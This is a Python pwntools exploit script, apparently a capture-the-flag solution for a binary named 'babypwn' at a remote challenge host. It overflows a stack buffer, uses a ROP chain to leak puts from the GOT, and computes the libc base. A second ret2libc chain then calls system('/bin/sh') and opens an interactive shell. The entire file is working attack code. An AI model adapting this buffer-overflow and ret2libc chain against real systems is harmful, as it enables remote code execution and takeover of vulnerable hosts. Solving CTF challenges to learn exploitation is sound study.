from pwn import *
REMOTE = 1
if REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.terminal = "tmux splitw -h -f".split()
elf = ELF('./babypwn', checksec=False)
#p = process("./babypwn")
p = remote("baby.uni.hctf.fun", 25251)
cmd = "b* 0x401168"
if not REMOTE:
    gdb.attach(p, cmd, gdb_args=["--init-eval-command='source ~/ctf/tools/gef/gef.py'"])
puts = elf.symbols['puts']
buf = "A"*0x88
pop_rdi = 0x0000000000401203
rop  = p64(pop_rdi)
rop += p64(elf.got['puts'])
rop += p64(elf.symbols['puts'])
rop += p64(elf.symbols['main'])
p.sendline(buf + rop)
p.recvline()
puts_libc = u64(p.recvuntil("\n", drop=True).ljust(8, "\x00"))
print(hex(puts_libc))
libc.address = puts_libc - libc.symbols['puts']
print(hex(libc.address))
system = libc.symbols['system']
print(hex(system))
binsh = libc.search("/bin/sh").next()
print(hex(binsh))
rop  = p64(pop_rdi)
rop += p64(binsh)
rop += p64(system)
print(repr(rop))
p.recvline()
p.sendline(buf + rop)
p.interactive()
